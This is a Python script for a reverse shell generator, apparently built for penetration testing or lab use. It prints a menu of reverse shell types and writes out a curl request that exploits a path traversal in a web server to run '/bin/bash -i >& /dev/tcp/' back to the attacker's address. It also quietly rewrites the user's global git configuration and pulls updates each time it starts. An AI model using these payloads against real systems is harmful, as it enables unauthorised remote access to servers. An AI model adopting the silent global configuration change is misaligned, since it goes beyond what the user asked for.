#! /usr/bin/env python3

# Reverse shell generator based on examples pulled from:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# This is uses the tun0 IPv4 address. Enter a specific port after calling the script

import sys
import os
import subprocess
from time import sleep
from src.design import print_error, print_info, print_shell, bcolors

# Support between python2 and python3
try: input = raw_input
except: pass


# Grab the latest update
def update():
	# force https for git
	def git_https_force():
		subprocess.Popen('git config --global url."https://github.com/".insteadOf git@github.com:;git config --global url."https://".insteadOf git://', shell=True).wait()

	# force https
	git_https_force()

	# try to update ourself first
	print_info("Trying to update myself first... Then will generate the shellcode...")
	subprocess.Popen("git pull", shell=True).wait()
	sleep(1)


def banner():
	__version__ = 0.4

	banner = bcolors.DARKGREEN + """
	███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
	██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
	███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
	╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
	███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
	╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
	""" +bcolors.ENDC
	banner += """
	Version: """ + bcolors.YELLOW + str(__version__) + bcolors.DARKGREEN + """\n
	Author: AgentWhite (@__Th3J0k3r__) (github.com/realagentwhite)
	Website: https://thegibson.xyz"""
	banner += """
	Reverse shell generator based on examples pulled from:
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
	This is uses the tun0 IPv4 address. Enter a specific port after calling the script
	""" + bcolors.ENDC
	
	return banner



def main():
	try:
		# Call the function to grab latest update
		update()
		
		# List of shells available
		shells = ["bash","go","nc","curl","netcat","msfvenom","perl","php","python","powershell","ruby","xterm"]
		
		# Print the IP on tun0 and port we passed in the arguments
		print(bcolors.DARKGREEN + "[*]tun0 IP: " + ip + " port: " + port + bcolors.ENDC)

		print_error("Shell types:")

		def print_shell_types(message):
			print((bcolors.RED) + ("[*] ") + (bcolors.YELLOW) + (str(message)) + (bcolors.ENDC))

		for shell in shells:
			print_shell_types(shell)

		print_info("There is also the option for 'all' to print all shells")
		
		print(bcolors.ENDC)
		data = input("Enter the type of shell:~$ "+bcolors.DARKPURPLE).lower()
		print(bcolors.ENDC)
		
		# Since for the curl reverse shell you have to enter a target and it's port, I had to create it apart
		# from the rest of the shell code list
		if data == 'curl':
			target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
			rport = input("Enter target port:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
			curl = """curl -s -X POST 'http://"""+target+""":"""+rport+"""/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1"'"""
			print(bcolors.YELLOW+"[1] "+bcolors.ENDC+curl)
		
		from src.core import return_shells
		return_shells(data, ip, port)

	except KeyboardInterrupt:
		print_info("Exiting...now")
		sys.exit()


def only_port_passed():
	global ip, port
	try:
		# The variable below will get the VPN of the tun0 instead of the user having to enter it
		ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
		port = sys.argv[1]
		main()
	except IndexError:
		print_error("Check that you are connected to the VPN\n")
		sys.exit()


if __name__ == "__main__":
	os.system("clear")
	print(banner())

	if len(sys.argv) == 1:
		print_info("Usage: %s <LHOST> <LPORT>" % str(sys.argv[0]))

	elif len(sys.argv[-1]) > 5:
		print_info("There is a max of ports up to 65535")
		print_info("You entered %s"%sys.argv[1])
		sys.exit()
	elif len(sys.argv) == 3:
		ip = sys.argv[1]
		port = sys.argv[2]
		main()
	elif len(sys.argv) == 2:
		if '.' in sys.argv[-1]:
			print_error("You forgot to add the port wich goes last in the arguments.") 
			sys.exit()
		else:
			only_port_passed()
	else:
		only_port_passed()
